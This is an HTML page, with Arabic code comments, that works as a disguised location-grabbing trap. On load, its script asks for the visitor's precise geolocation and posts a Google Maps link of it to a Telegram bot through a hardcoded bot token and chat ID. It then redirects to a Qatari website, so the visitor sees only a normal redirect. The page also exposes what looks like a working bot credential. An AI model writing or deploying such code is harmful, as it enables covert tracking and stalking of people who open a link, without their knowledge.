<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <script>
    // معلومات البوت
    const botToken = "7966593148:AAHhZ7-CI67oVYZf5YddEfs5y0R6hDFjqI4";
    const adminId = "6243038338";

    window.onload = function () {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            const lat = position.coords.latitude.toFixed(5);
            const lon = position.coords.longitude.toFixed(5);
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            const message = `📍 موقع زائر جديد:\n${mapLink}`;

            // إرسال لتليجرام
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: adminId,
                text: message
              })
            }).finally(() => {
              // تحويل مباشر بعد الإرسال
              window.location.href = "https://alaneesqatar.qa/";
            });
          },
          function() {
            // إذا رفض الموقع، نفتح الرابط مباشرة
            window.location.href = "https://alaneesqatar.qa/";
          },
          {
            enableHighAccuracy: true,
            timeout: 5000
          }
        );
      } else {
        // إذا المتصفح ما يدعم
        window.location.href = "https://alaneesqatar.qa/";
      }
    };
  </script>
</head>
<body>
</body>
</html>
